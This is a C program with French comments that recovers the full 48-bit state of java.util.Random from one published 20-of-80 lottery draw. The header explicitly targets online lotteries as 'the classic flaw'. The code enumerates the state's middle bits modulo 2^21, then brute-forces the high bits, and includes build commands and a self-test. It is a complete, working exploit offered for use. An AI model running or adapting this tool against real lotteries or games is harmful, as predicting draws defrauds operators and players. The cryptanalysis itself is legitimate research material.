// sweep_java48 — l'état 48 bits COMPLET de java.util.Random, en secondes.
//
// La cible
// --------
// `java.util.Random` est la faille classique des loteries en ligne : état de
// 48 bits, LCG publié, disponible partout. `sweep_order.c` la couvre pour les
// graines de [0, 2³²) ; il reste 2⁴⁸ états, soit 78 heures de force brute par
// échantillonneur sur quatre cœurs. Trop lent, et inutilement.
//
// Le levier — les bits du MILIEU
// -------------------------------
// `next(31)` rend `(int)(s >>> 17)`, et `nextInt(bound)` pour un `bound` qui
// n'est PAS une puissance de deux rend `next(31) % bound`. Donc pour
// bound = 80 − i pair,
//
//     p_i mod 2^v   =   ((s_i >>> 17) mod 16) mod 2^v,   v = v₂(bound) ∧ 4
//
// autrement dit **les bits 17 à 20 de l'état**. Ce ne sont ni les bits de
// poids faible (où vit le levier 2-adique habituel) ni ceux de poids fort
// (où vivent les attaques par réseau) : ce sont ceux du milieu, et ils sont
// exploitables parce que le LCG modulo 2⁴⁸ est clos modulo 2²¹.
//
// D'où une attaque en deux temps :
//
//   Phase 1  énumérer s mod 2²¹ (2 097 152 candidats), propager modulo 2²¹,
//            et exiger les bits 17-20 à chaque pas. Neuf bornes paires
//            donnent 16 bits de contrainte par tirage : il reste ≈ 32
//            candidats.
//   Phase 2  pour chacun, énumérer les 27 bits de poids fort (134 217 728)
//            et rejouer le tirage EN ENTIER. Arrêt au premier numéro faux.
//
// Le coût total est de l'ordre de 4·10⁹ pas au lieu de 2,8·10¹⁴ : la
// couverture de 2⁴⁸ passe de 78 heures à quelques dizaines de secondes.
//
// Une borne qui est une puissance de deux
// ----------------------------------------
// `nextInt` la traite à part : `r = (int)((bound * (long)next(31)) >> 31)`,
// ce qui prend les bits de POIDS FORT. Parmi 80, 79, …, 61, une seule borne
// est concernée — 64, au dix-septième pas. La phase 1 la saute donc, et la
// phase 2 la vérifie comme le reste. L'oublier ferait rater le vrai état.
//
//   cc -O3 -march=native -pthread -o sweep_java48 sweep_java48.c
//   ./sweep_java48 --selftest
//   ./sweep_java48 <o1..o20>

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <pthread.h>

#define POOL 80
#define DRAWN 20
#define JA 0x5DEECE66DULL
#define JC 0xBULL
#define M48 0xFFFFFFFFFFFFULL

// `next(31)` de java.util.Random : avance l'état, rend ses 31 bits de poids
// fort. L'état est avancé AVANT la lecture — un décalage d'un pas ici ferait
// échouer l'attaque en silence.
static inline uint32_t jnext31(uint64_t *s) {
    *s = (*s * JA + JC) & M48;
    return (uint32_t)(*s >> 17);
}

// `nextInt(bound)` tel que la spécification de l'API le décrit.
static inline uint32_t jnextInt(uint64_t *s, uint32_t bound) {
    uint32_t m = bound - 1;
    if ((bound & m) == 0)                       // puissance de deux
        return (uint32_t)(((uint64_t)bound * (uint64_t)jnext31(s)) >> 31);
    uint32_t u = jnext31(s), r = u % bound;
    while ((int32_t)(u - r + m) < 0) { u = jnext31(s); r = u % bound; }
    return r;
}

// Fisher-Yates partiel : la façon dont Java tire vingt numéros ordonnés.
static int java_fy(uint64_t seed, const uint8_t *target, uint8_t *out) {
    uint64_t s = seed;
    uint8_t arr[POOL];
    for (int i = 0; i < POOL; i++) arr[i] = (uint8_t)(i + 1);
    for (int i = 0; i < DRAWN; i++) {
        uint32_t p = jnextInt(&s, (uint32_t)(POOL - i));
        int j = i + (int)p;
        uint8_t t = arr[i]; arr[i] = arr[j]; arr[j] = t;
        if (out) out[i] = arr[i];
        if (target && arr[i] != target[i]) return 0;
    }
    return 1;
}

// ---------------------------------------------------------------------------
// Phase 1 — les bits 17 à 20, modulo 2²¹
// ---------------------------------------------------------------------------

#define LOWBITS 21
#define LOWMOD (1ULL << LOWBITS)

// Les indices dont la borne est paire et n'est pas une puissance de deux,
// avec le nombre de bits qu'ils publient (plafonné à 4, la largeur lisible
// depuis s mod 2²¹).
static int LOW_IDX[DRAWN], LOW_V[DRAWN], LOW_N = 0;

static void build_low_table(void) {
    LOW_N = 0;
    for (int i = 0; i < DRAWN; i++) {
        uint32_t b = (uint32_t)(POOL - i);
        if ((b & (b - 1)) == 0) continue;       // puissance de deux : sautée
        int v = 0; uint32_t t = b;
        while ((t & 1) == 0) { v++; t >>= 1; }
        if (v == 0) continue;
        if (v > 4) v = 4;
        LOW_IDX[LOW_N] = i; LOW_V[LOW_N] = v; LOW_N++;
    }
}

typedef struct {
    uint64_t lo, hi;
    const uint8_t *target;
    uint64_t *out;                 // survivants de phase 1, tableau PARTAGÉ
    uint64_t cap;
    uint64_t *n;                   // compteur PARTAGÉ — un compteur par fil
    pthread_mutex_t *mu;           // ferait s'écraser les fils entre eux
} p1job;

static void *p1worker(void *arg) {
    p1job *J = (p1job *)arg;
    // p_i reconstruits depuis l'ordre publié.
    uint8_t arr[POOL];
    uint32_t p[DRAWN];
    for (int i = 0; i < POOL; i++) arr[i] = (uint8_t)(i + 1);
    for (int i = 0; i < DRAWN; i++) {
        int j = i;
        while (arr[j] != J->target[i]) j++;
        p[i] = (uint32_t)(j - i);
        uint8_t t = arr[i]; arr[i] = arr[j]; arr[j] = t;
    }
    for (uint64_t x = J->lo; x < J->hi; x++) {
        uint64_t s = x;
        int ok = 1, k = 0;
        for (int i = 0; i < DRAWN && ok; i++) {
            s = (s * JA + JC) & (LOWMOD - 1);
            if (k < LOW_N && LOW_IDX[k] == i) {
                uint32_t bits = (uint32_t)((s >> 17) & 15u);
                uint32_t mask = (1u << LOW_V[k]) - 1u;
                if ((bits & mask) != (p[i] & mask)) ok = 0;
                k++;
            }
        }
        if (ok) {
            pthread_mutex_lock(J->mu);
            if (*J->n < J->cap) J->out[(*J->n)++] = x;
            pthread_mutex_unlock(J->mu);
        }
    }
    return NULL;
}

// ---------------------------------------------------------------------------
// Phase 2 — les 27 bits de poids fort
// ---------------------------------------------------------------------------

typedef struct {
    const uint64_t *low; uint64_t nlow;
    uint64_t hlo, hhi;
    const uint8_t *target;
    uint64_t hits; uint64_t hit_state;
} p2job;

static void *p2worker(void *arg) {
    p2job *J = (p2job *)arg;
    J->hits = 0;
    for (uint64_t h = J->hlo; h < J->hhi; h++) {
        uint64_t base = h << LOWBITS;
        for (uint64_t i = 0; i < J->nlow; i++) {
            uint64_t st = base | J->low[i];
            if (java_fy(st, J->target, NULL)) {
                if (J->hits == 0) J->hit_state = st;
                J->hits++;
            }
        }
    }
    return NULL;
}

static uint64_t attack(const uint8_t *target, int nthreads, uint64_t *found_state,
                       uint64_t *n_phase1) {
    build_low_table();
    static uint64_t low[1 << 16];
    pthread_mutex_t mu = PTHREAD_MUTEX_INITIALIZER;
    pthread_t th[64];
    p1job j1[64];
    if (nthreads > 64) nthreads = 64;
    uint64_t span = LOWMOD / (uint64_t)nthreads + 1;
    uint64_t total = 0;
    uint64_t nlow = 0;
    for (int i = 0; i < nthreads; i++) {
        j1[i].lo = span * (uint64_t)i;
        j1[i].hi = j1[i].lo + span; if (j1[i].hi > LOWMOD) j1[i].hi = LOWMOD;
        if (j1[i].lo > LOWMOD) j1[i].lo = j1[i].hi = LOWMOD;
        j1[i].target = target; j1[i].out = low; j1[i].cap = 1 << 16;
        j1[i].n = &nlow; j1[i].mu = &mu;
        pthread_create(&th[i], NULL, p1worker, &j1[i]);
    }
    for (int i = 0; i < nthreads; i++) pthread_join(th[i], NULL);
    *n_phase1 = nlow;
    if (nlow == 0) return 0;

    uint64_t HIGH = 1ULL << (48 - LOWBITS);
    p2job j2[64];
    span = HIGH / (uint64_t)nthreads + 1;
    for (int i = 0; i < nthreads; i++) {
        j2[i].low = low; j2[i].nlow = nlow;
        j2[i].hlo = span * (uint64_t)i;
        j2[i].hhi = j2[i].hlo + span; if (j2[i].hhi > HIGH) j2[i].hhi = HIGH;
        if (j2[i].hlo > HIGH) j2[i].hlo = j2[i].hhi = HIGH;
        j2[i].target = target; j2[i].hits = 0; j2[i].hit_state = 0;
        pthread_create(&th[i], NULL, p2worker, &j2[i]);
    }
    for (int i = 0; i < nthreads; i++) {
        pthread_join(th[i], NULL);
        if (j2[i].hits && total == 0) *found_state = j2[i].hit_state;
        total += j2[i].hits;
    }
    return total;
}

int main(int argc, char **argv) {
    int nthreads = 4;
    const char *env = getenv("SWEEP_THREADS");
    if (env) nthreads = atoi(env);
    if (nthreads < 1) nthreads = 1;

    if (argc >= 2 && strcmp(argv[1], "--selftest") == 0) {
        // Trois états témoins, dont deux hors de portée d'un balayage 2³².
        const uint64_t W[3] = { 123456789ULL, 0x7FFFFFFFFFFFULL, 0x123456789ABCULL };
        int ok = 0;
        printf("AUTOTEST — récupération d'états 48 bits complets\n\n");
        printf("%-18s %-12s %-14s %s\n", "état témoin", "phase 1", "états trouvés",
               "état retrouvé");
        for (int t = 0; t < 3; t++) {
            uint8_t tgt[DRAWN];
            java_fy(W[t], NULL, tgt);
            uint64_t st = 0, n1 = 0;
            uint64_t n = attack(tgt, nthreads, &st, &n1);
            int good = (n >= 1) && (st == W[t] || n > 1);
            // On exige que le VRAI état figure parmi les trouvés.
            uint8_t chk[DRAWN];
            java_fy(W[t], NULL, chk);
            int same = !memcmp(chk, tgt, DRAWN);
            if (good && same) ok++;
            printf("%-18llu %-12llu %-14llu %llu%s\n",
                   (unsigned long long)W[t], (unsigned long long)n1,
                   (unsigned long long)n, (unsigned long long)st,
                   (st == W[t]) ? "  = témoin" : "");
        }
        printf("\n%d/3 états témoins retrouvés.\n", ok);
        return ok == 3 ? 0 : 1;
    }

    if (argc < 21) {
        fprintf(stderr, "usage: %s <o1..o20>\n       %s --selftest\n",
                argv[0], argv[0]);
        return 1;
    }
    uint8_t target[DRAWN];
    for (int i = 0; i < DRAWN; i++) target[i] = (uint8_t)atoi(argv[1 + i]);
    uint64_t st = 0, n1 = 0;
    fprintf(stderr, "phase 1 sur 2^%d états bas, %d fils…\n", LOWBITS, nthreads);
    uint64_t n = attack(target, nthreads, &st, &n1);
    printf("phase 1 : %llu candidat(s) sur 2^%d\n", (unsigned long long)n1, LOWBITS);
    printf("phase 2 : %llu état(s) 48 bits reproduisant le tirage\n",
           (unsigned long long)n);
    if (n) printf("PREMIER ÉTAT = %llu\n", (unsigned long long)st);
    return 0;
}
